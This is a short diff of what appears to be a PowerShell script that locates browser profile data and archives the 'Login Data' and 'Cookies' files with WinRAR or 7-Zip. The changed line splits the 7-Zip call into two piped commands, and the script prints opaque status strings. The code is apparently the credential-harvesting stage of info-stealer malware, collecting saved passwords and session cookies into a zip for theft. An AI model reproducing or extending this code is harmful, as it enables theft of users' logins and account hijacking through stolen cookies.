@@ -45,7 +45,7 @@ if(Test-Path -Path $o){
   if("WinRAR" -in $arh)
     {Get-ChildItem -Path $o -Include ("Login Data"), ("Cookies") -Recurse | Compress-Archive -CompressionLevel Fastest -DestinationPath $p}
   elseif("7-Zip"-in $arh)
-    {.\7z.exe a $p ($o+"Login Data"),($o+"Cookies") -spf -tzip}
+    {.\7z.exe a $p ($o+"Login Data") -spf -tzip | .\7z.exe a $p ($o+"Cookies") -spf -tzip}
   echo "Oqwe"
 }
 else{echo "Oasd"}
